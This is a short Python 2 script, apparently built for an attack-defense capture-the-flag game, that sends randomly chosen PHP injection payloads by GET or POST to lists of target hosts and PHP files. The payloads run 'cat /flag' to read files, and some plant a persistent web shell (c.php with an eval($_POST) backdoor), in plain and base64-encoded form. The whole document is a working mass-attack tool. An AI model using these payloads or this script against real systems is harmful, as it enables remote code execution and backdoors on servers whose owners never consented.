import requests
import random

def confuse(ip = [],php_list = []):
	print "*******************************************************"
	payloads = ['system("cat /flag");', 'a=system&b=cat /flag', 'a=assert&b=${fputs%28fopen%28base64_decode%28Yy5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29};', 'a=assert&b=${fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x))};', 'a=assert&b=${fputs(fopen(c.php,w),<?php @eval($_POST[b47a1654c768fa46845e9822c33d5fe9]); ?>1)};', '%73%79%73%74%65%6d%28%22%63%61%74%20%2f%66%6c%61%67%22%29%3b', 'system%28%22cat%20%2fflag%22%29%3b','getflag','"cat /flag;"','echo file_get_contents("/flag");','var_dump(file_get_contents("/flag"));','give_me_flag()']
	for i in range(len(ip)):
		for j in range(len(php_list)):
			payload = payloads[random.randint(0,len(payloads)-1)]
			method = random.randint(1,2)
			if method == 1:
				data = {'cmd':payload}
				try:
					
					r = requests.get(ip[i]+'/'+php_list[j],params=data)
				except:
					print ip[i]+'/'+php_list[j]
					print 'Confuse failed.'
			if method == 2:
				data = {'cmd':payload}
				try:
					print ip[i]+'/'+php_list[j]
					r = requests.post(ip[i]+'/'+php_list[j],data=data)
					print 'Confused.'
				except:
					print 'Confuse failed.'
		print ip[i],'Confused.'
		print "*******************************************************"
